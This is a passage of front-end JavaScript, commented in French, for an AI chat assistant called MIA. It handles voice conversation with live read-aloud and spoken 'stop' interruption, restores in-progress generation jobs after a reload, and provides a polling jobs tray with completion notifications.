    // Une phrase entendue PENDANT la lecture. Seul un ordre d'arrêt compte ;
    // tout le reste est ignoré — une remarque, un « oui » d'approbation, ou
    // la voix de MIA elle-même, revenue par le micro (MiaVoiceCommands.
    // interruption compare la phrase au texte en cours de lecture). Un ordre
    // suivi d'autre chose (« stop, et pour demain ? ») emporte la suite.
    function hearWhileSpeaking(transcript) {
        const said = String(transcript || '').replace(/\s+/g, ' ').trim();
        if (!said || !VC) return;
        const hit = VC.interruption(said, spokenText());
        if (hit) interruptSpeech(hit.remainder);
    }

    // « Stop » (ou Passer) : MIA se tait et vous écoute. Si sa réponse
    // s'écrit encore, l'écriture s'arrête aussi (cf. stopWriting).
    function interruptSpeech(remainder) {
        if (mode !== 'speaking') return;
        stopReading();
        stopWriting();
        if (remainder) {
            // L'ordre portait déjà la suite : elle part comme le tour suivant,
            // sans repasser par l'écoute.
            bargeMicOpen = false;
            transcriber.releaseMic();
            newTurn();
            if (routeTurn(remainder)) return;
        }
        startListening();
    }

    function skipSpeech() { interruptSpeech(''); }

    // Interrompre MIA pendant qu'elle écrit encore arrête aussi l'écriture —
    // même demande que le bouton Stop du chat : on ne se tait pas en
    // continuant d'écrire, et la question suivante ne doit pas attendre la fin
    // d'une réponse que l'on a coupée. Le texte déjà écrit reste dans le fil,
    // marqué « réponse interrompue ».
    function stopWriting() {
        const st = turnStream;
        if (!st || st.done || !turnJobId || String(st.jobId) !== turnJobId) return;
        st.aborted = true;
        fetch(`/jobs/${turnJobId}/cancel`, { method: 'POST', headers: { 'X-CSRF-Token': csrfToken } }).catch(() => {});
    }

    // ---- Lecture en direct -------------------------------------------------
    // La voix démarre dès la première phrase écrite, sans attendre la fin de
    // la réponse. Le serveur relit ce que la génération du tour a déjà
    // produit — jamais un texte envoyé par le navigateur — et en rend le
    // passage suivant, coupé à une fin de phrase (POST /jobs/{id}/speak).
    // « Pas encore » (202) : la phrase suivante s'écrit ; on attend un nouveau
    // fragment du flux (mia:chat-progress), puis on redemande. Un seul passage
    // d'avance pendant qu'un autre joue, chacun au plus LIVE_GROWTH fois le
    // précédent : sa synthèse finit avant la voix qu'il suit, sans blanc.
    const LIVE_GROWTH   = 2.5;
    const LIVE_RETRY_MS = 350;  // jamais deux demandes « pas encore » plus rapprochées
    const LIVE_POLL_MS  = 1500; // sans nouvelle du flux, on redemande quand même
    let progressTick = 0;       // fragments reçus : une demande sait s'il est arrivé du neuf pendant qu'elle partait
    let wakeReader   = () => {};

    /** Un évènement de chat concerne-t-il la réponse du tour ? (fil ET génération) */
    function isTurnEvent(d) {
        if (String(d.convId) !== String(turnConvId)) return false;
        return !d.jobId || !turnJobId || String(d.jobId) === turnJobId;
    }

    document.addEventListener('mia:chat-progress', (ev) => {
        if (!isTurnEvent(ev.detail || {})) return;
        progressTick++;
        wakeReader();
    });

    async function submitTurn() {
        let outcome = false;
        try { outcome = await submitForm(); } catch (e) { console.error('[voice] submit failed', e); }
        if (mode !== 'sending') return; // conversation terminée entre-temps
        if (outcome === true) {
            turnConvId  = String(convId());
            turnStream  = activeStreams.get(turnConvId) || null;
            turnJobId   = turnStream && turnStream.jobId ? String(turnStream.jobId) : null;
            turnOutcome = null;
            setMode('thinking', t('MIA réfléchit…'));
            startTicks();
            if (turnJobId) readReply(turnJobId);
            return;
        }
        if (outcome === 'tool') { startListening(); return; } // création par un outil : rien à lire
        // Envoi refusé (erreur affichée dans le fil, quota, session) : on s'arrête.
        endConversation();
    }

    // Fin de la réponse du tour. Complète : la lecture va jusqu'au bout, puis
    // MIA écoute. Arrêtée (bouton Stop du chat) : MIA se tait et écoute.
    // Autre issue (quota, erreur, suivi perdu) : si MIA n'avait encore rien
    // dit, la conversation s'arrête et dit pourquoi ; sinon, elle finit de
    // lire ce qui a été écrit.
    document.addEventListener('mia:chat-turn-ended', (ev) => {
        const d = ev.detail || {};
        if ((mode !== 'thinking' && mode !== 'speaking') || !isTurnEvent(d)) return;
        turnOutcome = d;
        progressTick++;
        wakeReader(); // la fin du texte peut compléter le dernier passage
        const complete = d.status === 'done' && !d.hadError;
        if (d.status === 'cancelled' || (!complete && !readerSpoke)) stopReading();
        afterReply();
    });

    // La lecture est finie, ou n'avait rien à lire : MIA rend la parole —
    // sauf si la réponse a échoué avant qu'un mot ait été dit.
    function afterReply() {
        if (!readerDone || (mode !== 'thinking' && mode !== 'speaking')) return;
        if (readerSpoke) { startListening(); return; } // réponse lue jusqu'au bout
        const d = turnOutcome;
        if (!d) return; // rien de lu, la réponse s'écrit encore : sa fin dira quoi faire
        if ((d.status === 'done' && !d.hadError) || d.status === 'cancelled') { startListening(); return; }
        if (d.status === 'quota') { endConversation(); return; } // la fenêtre de quota est déjà ouverte
        // Réponse en erreur : le message de fin reprend la CAUSE affichée dans
        // le fil (titre de l'encadré), pas un « en erreur » qui n'apprend rien.
        endConversation(d.hadError
            ? (d.errorTitle
                ? t('Conversation vocale interrompue — {cause}', { cause: d.errorTitle })
                : t('Conversation vocale interrompue : la réponse est en erreur.'))
            : t('Conversation vocale interrompue : la réponse a été perdue.'));
    }

    // Lecture de la réponse du tour, passage après passage, pendant qu'elle
    // s'écrit. Tant que rien n'est prêt, MIA « réfléchit » (tics, annonces) ;
    // le premier passage arrivé, elle prend la parole.
    function readReply(jobId) {
        const seq = ++speakSeq;
        speakAbort?.abort();
        const abort = speakAbort = new AbortController();
        readerDone  = false;
        readerSpoke = false;
        (async () => {
            let next = requestSegment(jobId, 0, 0, seq, abort.signal);
            try {
                while (seq === speakSeq) {
                    const seg = await next;
                    if (!seg) break;
                    if (seq !== speakSeq) { URL.revokeObjectURL(seg.url); break; }
                    if (!readerSpoke) {
                        readerSpoke = true;
                        await beginSpeaking(seq);
                        if (seq !== speakSeq) { URL.revokeObjectURL(seg.url); break; }
                    }
                    // Le passage suivant se prépare PENDANT que celui-ci joue.
                    next = seg.final ? null : requestSegment(jobId, seg.next, Math.round(seg.chars * LIVE_GROWTH), seq, abort.signal);
                    try {
                        await enqueueAudio(seg.url, () => mode === 'speaking' && seq === speakSeq, voiceRate);
                    } finally {
                        URL.revokeObjectURL(seg.url);
                    }
                    if (!next) break;
                }
            } catch (e) {
                if (abort.signal.aborted || seq !== speakSeq) return;
                console.warn('[voice] playback failed', e);
                if (e && (e.quota || e.message === 'SESSION_EXPIRED')) { endConversation(); return; } // fenêtre de quota ou de reconnexion déjà ouverte
                if (e && e.payload) showLlmErrorToast(e.payload, e.message, t('Lecture à voix haute impossible'));
                else showToast(t('Lecture à voix haute impossible : {raison}', { raison: e && e.message ? e.message : '' }), 'warning');
            }
            if (seq !== speakSeq) return;
            readerDone  = true;
            liveWaiting = false;
            afterReply();
        })();
    }

    // Premier passage prêt : MIA prend la parole. Ce qui joue encore (annonce,
    // repère) finit d'abord, la voix enchaîne — jamais l'une par-dessus
    // l'autre. Interruption à la voix : le micro est repris AVANT la première
    // note (rouvrir la capture en pleine lecture la ferait hoqueter), sans
    // jamais retarder la voix de plus d'une seconde et demie.
    async function beginSpeaking(seq) {
        setMode('speaking', t('MIA vous répond'));
        await drainAudio();
        if (bargeIn && mode === 'speaking' && seq === speakSeq) {
            bargeMicOpen = true;
            setLive(t('Dites « stop » pour l\'interrompre'));
            await Promise.race([
                transcriber.attachMic(),
                new Promise((resolve) => setTimeout(resolve, 1500)),
            ]);
        }
    }

    // Coupe la lecture : téléchargements abandonnés, voix arrêtée.
    function stopReading() {
        speakSeq++;
        speakAbort?.abort();
        speakAbort = null;
        stopPlayer();
        readerDone  = true;
        liveWaiting = false;
    }

    // Demande lancée en avance : la promesse est aussi marquée « gérée » (un
    // abandon — Passer, Terminer — la rejette alors que plus personne ne
    // l'attend, ce qui ferait un rejet non traité dans la console).
    function requestSegment(jobId, from, max, seq, signal) {
        const promise = fetchSegment(jobId, from, max, seq, signal);
        promise.catch(() => {});
        return promise;
    }

    // Un passage de la réponse : son audio, où reprendre, s'il est le dernier
    // — ou null quand il n'y a plus rien à lire.
    async function fetchSegment(jobId, from, max, seq, signal) {
        let pos = from;
        while (seq === speakSeq && !signal.aborted) {
            const tick  = progressTick;
            const asked = Date.now();
            const fd = new FormData();
            fd.append('from', String(pos));
            if (max > 0) fd.append('max', String(max));
            const r = await fetchWithSessionGuard(`/jobs/${jobId}/speak`, {
                method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd, signal,
            });
            if (r.status === 202) {
                // La phrase suivante s'écrit encore (un bloc de code a pu être sauté).
                pos = headerInt(r, 'X-Speech-Next', pos);
                liveWaiting = true;
                await waitForText(signal, asked, tick);
                continue;
            }
            liveWaiting = false;
            if (r.status === 204) return null; // plus rien à lire (réponse finie, vide ou en erreur)
            if (!r.ok) {
                const err = await r.json().catch(() => ({}));
                if (r.status === 429 && handleQuotaExceededPayload(err)) {
                    const quota = new Error('quota');
                    quota.quota = true;
                    throw quota;
                }
                const refusal = new Error(err.error || t('HTTP {code}', { code: r.status }));
                refusal.payload = err.llm_error || null;
                throw refusal;
            }
            const blob = await r.blob();
            return {
                url:   URL.createObjectURL(blob),
                next:  headerInt(r, 'X-Speech-Next', pos),
                final: r.headers.get('X-Speech-Final') === '1',
                chars: headerInt(r, 'X-Speech-Chars', 0),
            };
        }
        return null;
    }

    function headerInt(r, name, fallback) {
        const value = parseInt(r.headers.get(name) || '', 10);
        return Number.isFinite(value) && value >= 0 ? value : fallback;
    }

    // Attend la suite du texte : un nouveau fragment du flux (ou la fin de la
    // réponse), faute de quoi LIVE_POLL_MS — jamais moins de LIVE_RETRY_MS
    // après la demande précédente.
    function waitForText(signal, asked, tick) {
        return new Promise((resolve) => {
            let timer = null;
            const finish = () => {
                clearTimeout(timer);
                signal.removeEventListener('abort', finish);
                if (wakeReader === wake) wakeReader = () => {};
                resolve();
            };
            const wake = () => {
                clearTimeout(timer);
                timer = setTimeout(finish, Math.max(0, asked + LIVE_RETRY_MS - Date.now()));
            };
            wakeReader = wake;
            signal.addEventListener('abort', finish);
            if (progressTick !== tick) wake(); // du neuf est arrivé pendant la demande
            else timer = setTimeout(finish, LIVE_POLL_MS);
        });
    }

    function play(url, rate) {
        return new Promise((resolve, reject) => {
            const finish = () => {
                player.onended = player.onerror = player.onloadedmetadata = null;
                playResolve = null;
                resolve();
            };
            playResolve = finish;
            player.onended = finish;
            player.onerror = () => {
                player.onended = player.onerror = player.onloadedmetadata = null;
                playResolve = null;
                reject(new Error(t('lecture audio impossible')));
            };
            player.src = url;
            // Posée après la source ET à l'arrivée des métadonnées : certains
            // moteurs remettent playbackRate à 1 en chargeant un nouveau média.
            applyRate(player, rate);
            player.onloadedmetadata = () => applyRate(player, rate);
            const p = player.play();
            if (p && typeof p.catch === 'function') p.catch(reject);
        });
    }

    function stopPlayer() {
        const resolve = playResolve;
        playResolve = null;
        if (resolve) resolve();
        try { player.pause(); } catch (_) {}
        try { player.removeAttribute('src'); player.load(); } catch (_) {}
    }

    function endConversation(message) {
        if (mode === 'off') return;
        turnSeq++;
        speakSeq++;
        stopTicks();
        speakAbort?.abort();
        speakAbort = null;
        stopPlayer();
        setMode('off');
        turnText = '';
        turnConvId = null;
        turnJobId = null;
        turnStream = null;
        turnOutcome = null;
        readerDone = true;
        readerSpoke = false;
        liveWaiting = false;
        bargeMicOpen = false;
        itemOrigin.clear();
        announced = new Set();
        transcriber.stop(); // rapporte les minutes écoutées, coupe le micro (sans effet si déjà arrêté)
        if (message) showToast(message, 'warning');
    }

    async function startConversation() {
        if (mode !== 'off') return;
        window.stopDictation?.(); // un seul micro à la fois
        unlockAudio();
        setMode('connecting', t('Connexion…'));
        CUE_PREFETCH.forEach((type) => { cueUrl(type); });
        const ok = await transcriber.start();
        if (!ok && mode !== 'off') endConversation();
        // Session établie : onStarted a lancé l'écoute.
    }

    btn.addEventListener('click', () => {
        if (transcriber.isConnecting()) return;
        if (mode === 'off') startConversation();
        else endConversation();
    });
    barEnd?.addEventListener('click', () => endConversation());
    barSkip?.addEventListener('click', skipSpeech);
    // Exclusion mutuelle avec la dictée, et changement de conversation.
    window.stopVoiceChat = () => endConversation();
})();

// ---- Cartes d'approbation Google Drive en attente (rechargement de page) ----
(function initPendingDriveActions() {
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => { renderPendingDriveActions(); syncContinueButton(); }, { once: true });
    } else {
        renderPendingDriveActions();
        syncContinueButton();
    }
})();

// ---- Générations asynchrones encore en cours au chargement de la page ----
// La page a pu être rechargée (ou rouverte sur un autre onglet) pendant qu'une
// génération tournait : on se rattache à son flux au lieu de la perdre.
(function initActiveJobs() {
    const run = async () => {
        try {
            // fetchWithSessionGuard : session expirée (401) → modale « Session
            // expirée » au lieu d'un échec muet.
            const res = await fetchWithSessionGuard('/jobs/active', { headers: { 'X-CSRF-Token': csrfToken } });
            if (!res.ok) return;
            const data = await res.json();
            (data.jobs || []).forEach((job) => {
                // Le chat se rattache via activeStreams (même état qu'un flux
                // classique) et non via JOB_TYPES : tout le rendu de réponse est
                // déjà branché là.
                if (job.type === 'chat') {
                    const sameConv = String(job.conversation_id) === String(visibleConvId);
                    const el = sameConv ? appendMessage('assistant', '', [], true) : null;
                    if (el) updateStreamPhase(el, 'analyzing');
                    attachChatJob(job.id, job.conversation_id, el);
                    if (sameConv) { sendBtn.disabled = true; scrollBottom(true); }
                    return;
                }
                const type = JOB_TYPES[job.type];
                if (!type) return;   // type non géré côté client (ex. job hors chat)
                const state = attachJob(job.id, { type: job.type, convId: job.conversation_id });
                if (!jobIsVisible(state)) return;
                if (type.noBubble !== true) {
                    state.el = appendMessage('assistant', '', [], true);
                    setJobStatus(state.el, jobStatusLabel(state));
                }
                if (type.onRestore) type.onRestore(state);
                if (type.passive === true) return;
                sendBtn.disabled = true;
                scrollBottom(true);
            });
            refreshSendStopUi();
        } catch (_e) {
            // Restauration best-effort : son échec ne doit rien casser.
        }
    };
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', run, { once: true });
    } else {
        run();
    }
})();

// ---- Tiroir des générations en cours + notifications de fin ----
// Le tiroir lit `GET /jobs/active` : il voit donc aussi ce qui a été lancé
// depuis un AUTRE onglet ou un autre appareil, ce qu'un état purement local ne
// pourrait pas faire.
(function initJobsTray() {
    const tray      = document.getElementById('jobsTray');
    const toggle    = document.getElementById('jobsTrayToggle');
    const panel     = document.getElementById('jobsTrayPanel');
    const listEl    = document.getElementById('jobsTrayList');
    const labelEl   = document.getElementById('jobsTrayLabel');
    const notifyBtn = document.getElementById('jobsTrayNotify');
    if (!tray || !toggle || !panel || !listEl) return;

    const POLL_MS = 10000;
    const TYPE_LABELS = {
        chat: t('Réponse'), html: t('Page HTML'), image: t('Image'),
        video: t('Vidéo'), presentation: t('Présentation'), map: t('Carte'),
        gamma: t('Présentation Gamma'), native_deck: t('Fichier réalisé par le modèle'),
        mybrain_feed: t('Apport au cerveau MyBrain'),
        maintenance: t('Traitement'), credits_refresh: t('Mise à jour des prix'),
    };
    let timer = null;
    let lastCount = 0;
    // Session expirée : le poll s'arrête définitivement. Sans ce drapeau, le
    // tiroir continuait de frapper /jobs/active toutes les 10 s après
    // l'expiration → un 401 en console à chaque battement, indéfiniment.
    let stopped = false;

    function notifySupported() {
        return typeof window.Notification === 'function';
    }

    function syncNotifyBtn() {
        if (!notifyBtn) return;
        notifyBtn.hidden = !notifySupported() || Notification.permission !== 'default';
    }

    notifyBtn?.addEventListener('click', () => {
        if (!notifySupported()) return;
        // La demande de permission exige un geste utilisateur : c'est ce clic.
        Notification.requestPermission().then(() => {
            syncNotifyBtn();
            if (Notification.permission === 'granted') {
                showToast(t('Vous serez averti à la fin des générations.'), 'success');
            }
        }).catch(() => {});
    });

    toggle.addEventListener('click', () => {
        const open = toggle.getAttribute('aria-expanded') === 'true';
        toggle.setAttribute('aria-expanded', open ? 'false' : 'true');
        panel.hidden = open;
    });

    listEl.addEventListener('click', (e) => {
        const btn = e.target.closest('[data-job-act]');
        if (!btn) return;
        const jobId = btn.dataset.jobId;
        const cid   = btn.dataset.convId;
        if (btn.dataset.jobAct === 'open' && cid) {
            if (typeof switchConversation === 'function') switchConversation(cid);
            else window.location.href = '/chat/' + cid;
            return;
        }
        if (btn.dataset.jobAct === 'cancel' && jobId) {
            btn.disabled = true;
            fetch(`/jobs/${jobId}/cancel`, { method: 'POST', headers: { 'X-CSRF-Token': csrfToken } })
                .then(() => refresh())
                .catch(() => { btn.disabled = false; });
        }
    });

    function render(jobs) {
        const count = jobs.length;
        tray.hidden = count === 0;
        if (count === 0) {
            toggle.setAttribute('aria-expanded', 'false');
            panel.hidden = true;
            listEl.innerHTML = '';
            lastCount = 0;
            return;
        }
        labelEl.textContent = count === 1 ? t('1 génération en cours') : count + t(' générations en cours');

        listEl.innerHTML = '';
        jobs.forEach((job) => {
            const li = document.createElement('li');
            li.className = 'jobs-tray-item';

            const text = document.createElement('span');
            text.className = 'jobs-tray-item__text';
            const title = document.createElement('span');
            title.className = 'jobs-tray-item__title';
            title.textContent = job.label || TYPE_LABELS[job.type] || t('Génération');
            const meta = document.createElement('span');
            meta.className = 'jobs-tray-item__meta';
            meta.textContent = (TYPE_LABELS[job.type] || job.type)
                + (job.status === 'pending' ? t(' · en attente') : '');
            text.appendChild(title);
            text.appendChild(meta);
            li.appendChild(text);

            if (job.conversation_id) {
                const open = document.createElement('button');
                open.type = 'button';
                open.className = 'jobs-tray-item__btn';
                open.dataset.jobAct = 'open';
                open.dataset.convId = String(job.conversation_id);
                open.textContent = 'Voir';
                li.appendChild(open);
            }
            const cancel = document.createElement('button');
            cancel.type = 'button';
            cancel.className = 'jobs-tray-item__btn';
            cancel.dataset.jobAct = 'cancel';
            cancel.dataset.jobId = String(job.id);
            cancel.textContent = t('Arrêter');
            li.appendChild(cancel);

            listEl.appendChild(li);
        });
        lastCount = count;
        syncNotifyBtn();
    }

    async function refresh() {
        if (stopped) return;   // couvre aussi visibilitychange / mia-jobs-changed
        try {
            const res = await fetchWithSessionGuard('/jobs/active', { headers: { 'X-CSRF-Token': csrfToken } });
            if (!res.ok) return;
            const data = await res.json();
            render(Array.isArray(data.jobs) ? data.jobs : []);
        } catch (err) {
            if (err && err.message === 'SESSION_EXPIRED') {
                // La modale « Session expirée » est déjà affichée par
                // fetchWithSessionGuard ; on coupe le poll pour de bon.
                stopped = true;
                if (timer) { clearInterval(timer); timer = null; }
                return;
            }
            // Le tiroir est un confort : son échec ne doit rien casser.
        }
    }

    function schedule() {
        if (timer) clearInterval(timer);
        timer = setInterval(() => {
            if (document.hidden) return;   // onglet en arrière-plan : rien à afficher
            refresh();
        }, POLL_MS);
    }

    document.addEventListener('visibilitychange', () => { if (!document.hidden) refresh(); });
    window.addEventListener('mia-jobs-changed', refresh);

    syncNotifyBtn();
    refresh();
    schedule();
})();

/**
 * Notification système de fin de génération. N'est émise que si l'utilisateur
 * ne peut PAS la voir arriver (onglet caché, ou conversation non affichée) —
 * une notification pour un résultat déjà sous les yeux serait du bruit.
 */
function notifyJobDone(message, convIdForJump) {
    try {
        if (typeof window.Notification !== 'function' || Notification.permission !== 'granted') return;
        const notif = new Notification('MIA', {
            body: message,
            tag: 'mia-job-' + (convIdForJump || 'x'),
            icon: '/assets/img/icons/icon-192.png',
        });
        notif.onclick = () => {
            window.focus();
            if (convIdForJump && typeof switchConversation === 'function') {
                switchConversation(convIdForJump);
            }
            notif.close();
        };
    } catch (_e) {
        // Notifications refusées / indisponibles : sans effet.
    }
}
